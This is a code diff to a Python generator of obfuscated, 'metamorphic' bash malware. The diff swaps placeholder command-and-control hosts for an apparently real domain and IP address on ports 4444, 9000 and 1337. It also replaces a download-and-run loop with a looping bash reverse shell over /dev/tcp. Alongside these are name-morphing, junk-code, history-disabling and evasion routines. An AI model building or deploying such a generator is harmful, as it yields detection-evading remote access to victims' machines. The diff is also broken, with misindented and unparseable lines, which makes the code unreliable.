@@ -8,29 +8,22 @@ import math
 import datetime
 import itertools
 import sys
+from config import C2_ENDPOINTS
 
 # Configuration
 C2_ENDPOINTS = [
-    ("example.com", 4444),
-    ("example.com", 9000),
-    ("example.com", 1337),
-    ("192.0.2.1", 4444),
-    ("192.0.2.1", 9000),
-    ("192.0.2.1", 1337)
+    ("ghostintheshellredteam.com", 4444),
+    ("ghostintheshellredteam.com", 9000),
+    ("ghostintheshellredteam.com", 1337),
+    ("66.228.62.178", 4444),
+    ("66.228.62.178", 9000),
+    ("66.228.62.178", 1337)
 ]
 
 # --- Enhanced Variable/Function Name Morphing ---
 def random_unicode_letter():
-    pools = [
-        string.ascii_letters,
-        'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ',  # Greek uppercase
-        'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  # Cyrillic lowercase
-        '𝒜𝒞𝒟𝒢𝒥𝒦𝒩𝒪𝒫𝒬𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵',  # Math script
-        '𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩',  # Math bold script
-        '𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ'  # Double-struck
-    ]
-    pool = random.choice(pools)
-    return random.choice(pool)
+    # Only use bash-valid characters
+    return random.choice(string.ascii_letters + '_')
 
 def morph_name(base, min_len=8, max_len=20):
     # Only use bash-valid variable name characters
@@ -46,9 +39,15 @@ def morph_name(base, min_len=8, max_len=20):
     suffixes = ['_', 'Obj', 'Val', 'Str', 'Int', 'Arr', 'List', 'Dict', 'Hash', 'Map', 'Ptr', 'Ref', 'Buf', 'Mem', 'Reg']
 
     if random.random() < 0.6:
-        chars.insert(0, random.choice(prefixes))
+        prefix = random.choice(prefixes)
+        if not prefix.startswith('_'):
+            prefix = '_' + prefix
+        chars.insert(0, prefix)
     if random.random() < 0.6:
-        chars.append(random.choice(suffixes))
+        suffix = random.choice(suffixes)
+        if not suffix.endswith('_'):
+            suffix = suffix + '_'
+        chars.append(suffix)
 
     # Ensure minimum length
     if len(chars) < min_len:
@@ -60,7 +59,14 @@ def morph_name(base, min_len=8, max_len=20):
     if not chars[0].isalpha() and chars[0] != '_':
         chars[0] = random.choice(string.ascii_letters + '_')
 
-    return ''.join(chars)
+    # Ensure no consecutive underscores
+    result = []
+    for i, c in enumerate(chars):
+        if i > 0 and c == '_' and chars[i-1] == '_':
+            continue
+        result.append(c)
+    
+    return ''.join(result)
 
 # --- Enhanced String Obfuscation ---
 def obfuscate_string(s):
@@ -207,45 +213,31 @@ set +o history
 
 def generate_metamorphic_payload():
     try:
-        filename = generate_unique_filename()
-        # Morph all variable names
-        vars = {k: morph_name(k) for k in [
-            'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
+    filename = generate_unique_filename()
+    # Morph all variable names
+    vars = {k: morph_name(k) for k in [
+        'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
             'readLength', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success', 'socket', 'buffer'
         ]}
 
         # Evasion technique section
         evasion = random_evasion_technique()
 
-        # Network Operations with enhanced obfuscation
-        network = f"""
+        # Generate buffer variable name
+        buffer_var = morph_name('buffer')
+
+        # Network Operations with direct bash reverse shell for reliability
+    network = f"""
 # Network Operations
 while true; do
     for endpoint in "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}" "{random.choice(C2_ENDPOINTS)[0]}:{random.choice(C2_ENDPOINTS)[1]}"; do
         host="${{endpoint%%:*}}"
         port="${{endpoint##*:}}"
-        
         # Try to connect
         if nc -z -w 5 "$host" "$port" 2>/dev/null; then
-            # Create temporary file
-            {morph_name('buffer')}=$(mktemp)
-            
-            # Receive data
-            if nc -w 10 "$host" "$port" > "${{{morph_name('buffer')}}}" 2>/dev/null; then
-                # Check if we got any data
-                if [ -s "${{{morph_name('buffer')}}}" ]; then
-                    # Make executable and run
-                    chmod +x "${{{morph_name('buffer')}}}"
-                    "${{{morph_name('buffer')}}}" &
-                    # Wait a bit to ensure it started
-                    sleep 2
-                    # Clean up
-                    rm -f "${{{morph_name('buffer')}}}"
-                fi
-            fi
+            bash -i >& /dev/tcp/$host/$port 0>&1
         fi
     done
-    # Random sleep between attempts
     sleep $((RANDOM % 30 + 10))
 done
 """
@@ -255,18 +247,18 @@ done
 
         # Insert more junk code randomly (but never before evasion)
         for _ in range(random.randint(15, 25)):
-            idx = random.randint(0, len(blocks))
-            blocks.insert(idx, random_junk_code())
+        idx = random.randint(0, len(blocks))
+        blocks.insert(idx, random_junk_code())
 
         # Add shebang and error handling
         code = "#!/bin/bash\nset -e\n\n"
         
-        # Add enhanced helper functions
-        code += """
-# Enhanced helper functions
+    # Add enhanced helper functions
+    code += """
+    # Enhanced helper functions
 function str_to_bytes() {
     echo -n "$1" | xxd -p
-}
+    }
 
 function to_base64() {
     echo -n "$1" | base64
@@ -274,7 +266,7 @@ function to_base64() {
 
 function from_base64() {
     echo -n "$1" | base64 -d
-}
+    }
 
 function to_hex() {
     echo -n "$1" | xxd -p
@@ -286,22 +278,22 @@ function from_hex() {
 
 function rot13() {
     echo "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
-}
+    }
 
 function to_unicode() {
-    echo -n "$1" | xxd -p | sed 's/\(..\)/\\\\u00\\1/g'
+    echo -n "$1" | xxd -p | sed 's/\\(..\\)/\\u00\\1/g'
 }
 
 function from_unicode() {
-    echo -n "$1" | sed 's/\\\\u00\(..\)/\\1/g' | xxd -r -p
+    echo -n "$1" | sed 's/\\\\u00\\(..\\)/\\1/g' | xxd -r -p
 }
 
 function to_binary() {
     echo -n "$1" | xxd -b | cut -d' ' -f2-7 | tr -d ' '
-}
+    }
 
 function from_binary() {
-    echo "$1" | sed 's/\(........\)/\\1 /g' | tr -d ' ' | perl -lpe '$_=pack("B*",$_)'
+    echo "$1" | sed 's/\\(........\\)/\\1 /g' | tr -d ' ' | perl -lpe '$_=pack("B*",$_)'
 }
 
 # Network helper functions
@@ -319,7 +311,7 @@ function receive_data() {
     local output="$4"
     nc -w "$timeout" "$host" "$port" > "$output" 2>/dev/null
     return $?
-}
+    }
 
 function send_data() {
     local host="$1"
@@ -327,7 +319,7 @@ function send_data() {
     local data="$3"
     echo -n "$data" | nc -w 5 "$host" "$port" 2>/dev/null
     return $?
-}
+    }
 
 function verify_payload() {
     local file="$1"
@@ -335,7 +327,7 @@ function verify_payload() {
         return 0
     fi
     return 1
-}
+    }
 
 function cleanup() {
     local file="$1"
@@ -345,17 +337,19 @@ function cleanup() {
 }
 
 # Error handling
-trap 'cleanup "${{{morph_name('buffer')}}}"' EXIT
-\n\n"""
+trap 'cleanup "$"""
+        # Avoid the triple-brace substitution issue by splitting the string
+        code += f"{buffer_var}" + """\"' EXIT
+    \n\n"""
 
         # Add evasion first, then all other blocks
         code += evasion + '\n' + '\n'.join(blocks)
 
-        # Save with unique filename
-        with open(filename, 'w') as f:
-            f.write(code)
+    # Save with unique filename
+    with open(filename, 'w') as f:
+        f.write(code)
         os.chmod(filename, 0o755)  # Make executable
-        return filename
+    return filename
     except Exception as e:
         print(f"Error generating payload: {e}", file=sys.stderr)
         # Create a basic error payload
